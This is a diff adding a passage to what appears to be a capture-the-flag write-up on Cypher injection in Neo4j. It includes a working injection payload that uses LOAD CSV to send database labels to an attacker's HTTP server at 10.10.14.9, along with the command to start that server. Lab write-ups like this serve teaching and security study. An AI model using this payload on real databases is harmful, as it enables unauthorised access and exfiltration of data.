@@ -488,10 +488,24 @@ Let’s start with a brief introduction.
 Cypher is the query language used by Neo4j, a popular graph database.  
 It’s similar in purpose to SQL but is specifically designed for querying and manipulating graph data structures rather than traditional relational tables.  
 
-You’ve probably heard of SQL injection, a common attack where malicious users inject SQL code into queries to manipulate or access unauthorized data. Similarly, Cypher injection occurs when an attacker injects malicious Cypher code into a query, exploiting vulnerabilities in how the query is constructed or parameterized.  
+You’ve probably heard of SQL injection, a common attack where malicious users inject SQL code into queries to manipulate or access unauthorized data. Similarly, Cypher injection occurs when an attacker injects malicious Cypher code into a query, exploiting vulnerabilities in how the query is constructed or parameterized.   
 
+We can verify if it's vulnerable by simply using query that will return everything.  
+![obraz](https://github.com/user-attachments/assets/85e1a763-3bc8-4637-8ed8-76c04fbf627f)
 
+It returned all records meaning we have a proof of concept.  
 
+Let's now start with dumping the database, first we will list labels using this payload:  
+```
+' OR 1=1 WITH 1 as a CALL db.labels() YIELD label LOAD CSV FROM 'http://10.10.14.9/?'+label AS b RETURN b//
+```
+Before running it we need to start python server:  
+```
+python3 -m http.server 80
+```
+LOAD CSV will send output to our server as shown below:  
+
+![obraz](https://github.com/user-attachments/assets/2e29c9e5-5cfe-492b-8d55-15469bed4d3c)
 
 
 
